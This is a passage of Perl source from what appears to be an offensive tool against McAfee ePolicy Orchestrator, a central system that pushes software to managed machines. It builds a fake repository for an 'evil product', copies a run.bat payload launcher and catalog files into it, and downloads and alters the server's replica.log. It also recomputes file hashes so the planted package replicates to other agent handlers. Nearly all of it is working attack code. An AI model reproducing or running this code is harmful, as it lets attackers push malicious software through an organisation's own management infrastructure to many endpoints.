	# Copy catalog.z
	print "      [+] Copying catalog.z\n" if $this->{verbose};
        my $catalog_z = $this->{catalog_tmp_folder} . '/' . $this->{catalog_z_file};
	copy($catalog_z, $this->{deploy_local_repository} . '/Software/catalog.z' )  or die "[-] ERROR (mode_client_deploy_create_local_repository): catalog.z Copy failed: $!";	
	copy($catalog_z, $this->{deploy_local_repository} . '/RepoCache/catalog.z' ) or die "[-] ERROR (mode_client_deploy_create_local_repository): catalog.z Copy failed: $!";

	# copy PkgCatalog.z
	print "      [+] Copying PkgCatalog.z\n" if $this->{verbose};
	my $pkgcatalog_z = $this->{pkgcatalog_tmp_folder} . '/' . $this->{pkgcatalog_z_file};
	copy($pkgcatalog_z, $software_folder  . '/PkgCatalog.z' )  or die "[-] ERROR (mode_client_deploy_create_local_repository): pkgcatalog.z Copy failed: $!";
	copy($pkgcatalog_z, $repocache_folder . '/PkgCatalog.z' )  or die "[-] ERROR (mode_client_deploy_create_local_repository): pkgcatalog.z Copy failed: $!";

	# copy run.bat 
	print "      [+] Copying run.bat\n" if $this->{verbose};
	my $run_bat_path = $this->{deploy_run_bat};
	my $run_bat_filename = fileparse($run_bat_path);
	copy($run_bat_path, $software_folder  . '/' . $run_bat_filename) or die "[-] ERROR (mode_client_deploy_create_local_repository): $run_bat_path Copy failed: $!";
	copy($run_bat_path, $repocache_folder . '/' . $run_bat_filename) or die "[-] ERROR (mode_client_deploy_create_local_repository): $run_bat_path Copy failed: $!";


	# create a uniq tag file
        open FILE, ">$software_folder/$random_tag_file" or die "ERROR (mode_client_deploy_update_software_replica): Can't create " . $software_folder . "/" . $random_tag_file . ": $!\n";
        print FILE "not empty";
        close FILE;

        open FILE, ">$repocache_folder/$random_tag_file" or die "ERROR (mode_client_deploy_update_software_replica): Can't create " . $repocache_folder . "/" . $random_tag_file . ": $!\n";
	print FILE "not empty";
        close FILE;


	# create Replica.log files
	$this->mode_client_deploy_create_replica($this->{deploy_local_repository} . "Software/" . "Current/" . $this->{deploy_evil_product_id} . '/'. "Install/" . "0409");
	$this->mode_client_deploy_create_replica($this->{deploy_local_repository} . "Software/" . "Current/" . $this->{deploy_evil_product_id} . '/'. "Install/");
	$this->mode_client_deploy_create_replica($this->{deploy_local_repository} . "Software/" . "Current/" . $this->{deploy_evil_product_id} );
	
        $this->mode_client_deploy_create_replica($this->{deploy_local_repository} . "RepoCache/" . "Current/" . $this->{deploy_evil_product_id} . '/'. "Install/" . "0409");
        $this->mode_client_deploy_create_replica($this->{deploy_local_repository} . "RepoCache/" . "Current/" . $this->{deploy_evil_product_id} . '/'. "Install/");
        $this->mode_client_deploy_create_replica($this->{deploy_local_repository} . "RepoCache/" . "Current/" . $this->{deploy_evil_product_id} );



	
}



sub mode_client_deploy_update_software_replica {

	# File /Software/Current/replica.log contains the list of all McAfee software present on the repository, branch: "Current"
	# We have to add our evil product in the file in order to allow software replication between repository caches and other Agent-Andler.
	# In this function, we download the official replica.log file from the repository, update it, then store the new version under
	# our own repository (tmp/deployment/repo). Our local repository will then be ZIPed, uploaded on the server, and unzipped in a later step.
	# the official replica.log files will then be overwritten with our version.

	my $this = shift;

	print "[*] Updating /Software/Current/replica.log\n";


        my $server_host = $this->{server_host};
        my $server_port = $this->{server_port};
        my $uri = "https://$server_host:$server_port/Software/Current/replica.log";
        
	# Download replica.log
	my $replica_content = $this->http_poll_uri_get($uri);
	if($replica_content eq 0){
                $this->print_err ("[-] ERROR (mode_client_deploy_update_software_replica): Can't download replica.log. Software replication with multiple Agent Handlers may fails\n");
		return 0;
        }

	# Replica.log sample
	#------------------

	# [General]
	# NumItems=12
	# [ITEM_1]
	# Name=EPOAGENT3000
	# Type=Directory
	# Size=0
	# Hash=
	# Hash256=
	# [ITEM_2]
	# ...
	
	# Did we already add our Evil product name in that file ? (previous session)
	if($replica_content =~ /$this->{deploy_evil_product_id}/){
		# No additional modification is needed
		return 1; 
	}	

	# Get "NumItems"
        my $numitems = $1 if $replica_content =~ /.*NumItems=([0-9]+).*/g || -1;
        if($numitems eq -1){
                $this->print_err ("[-] ERROR (mode_client_deploy_update_software_replica): Can't extract 'NumItems' from replica.log. Abording\n");
                return 0;
        }

	# Replace value
	my $numitems_new = $numitems+1;
	$replica_content =~ s/NumItems=$numitems/NumItems=$numitems_new/;

	# Add our product and end of the file
	$replica_content .= 
		"[ITEM_$numitems_new]\r\n" .
		"Name=$this->{deploy_evil_product_id}\r\n" .
		"Type=Directory\r\n" .
		"Size=0\r\n" .
		"Hash=\r\n" .
		"Hash256=\r\n";

	# Save it on the new repository
	my $software_folder =   $this->{deploy_local_repository} .
                                "Software/" .
                                "Current/" ;
        my $repocache_folder =   $this->{deploy_local_repository} .
                                "RepoCache/" .
                                "Current/" ;
	open FILE, ">$software_folder/replica.log" or die "ERROR (mode_client_deploy_update_software_replica): Can't create $software_folder/replica.log: $!\n";
	print FILE $replica_content;
	close FILE;

        open FILE, ">$repocache_folder/replica.log" or die "ERROR (mode_client_deploy_update_software_replica): Can't create $repocache_folder/replica.log: $!\n";
        print FILE $replica_content;
        close FILE;

	return 1;
}



sub mode_client_deploy_create_replica {
	my $this = shift;
	my $folder = shift;

	if (not -d $folder){
		$this->print_err("[-] ERROR (mode_client_deploy_create_replica): '$folder' is not a valid directory\n");
		return 0;
	}

	my $replica_content='';
	my $replica_numitems=0;

	# open and read dir
	opendir DIR, $folder or die "[-] ERROR (mode_client_deploy_create_replica): can't open '$folder' directory\n";
	my @files = readdir(DIR);
	close DIR;

	# for each entry
	foreach my $entry (@files){
		next if $entry =~ /^\.$|^\.\.$|^replica.log$/;
		
		$replica_numitems++;

		$replica_content .= "[Item_" . $replica_numitems . "]\r\n";
		$replica_content .= "Name=$entry\r\n";

		if(-d $folder . '/' . $entry ){	# folder ?
			$replica_content .= "Type=Directory\r\n";
			$replica_content .= "Size=0\r\n" ;
			$replica_content .= "Hash=\r\n" ;
			$replica_content .= "Hash256=\r\n" ;

		}else{
			$replica_content .= "Type=File\r\n";
			my $size = -s $folder . '/' . $entry;
			$replica_content .= "Size=$size\r\n" ;
			# compute SHA1
			my $sha = Digest::SHA->new(1);
			$sha->addfile($folder . '/' . $entry);
			$replica_content .= "Hash=" . uc($sha->hexdigest()) . "\r\n";
                        # compute SHA256
                        $sha = Digest::SHA->new(256);
                        $sha->addfile($folder . '/' . $entry);
                        $replica_content .= "Hash256=" . uc($sha->hexdigest()) . "\r\n";
		}
	}
	
	# write final replica.log
	open FILE, ">$folder/replica.log" or die "[-] ERROR (mode_client_deploy_create_replica): can't open '$folder/replica.log' for writing\n";
	print FILE "[General]\r\n";
	print FILE "NumItems=$replica_numitems\r\n";
	print FILE $replica_content;
	close FILE;

	return 1;
}


1;
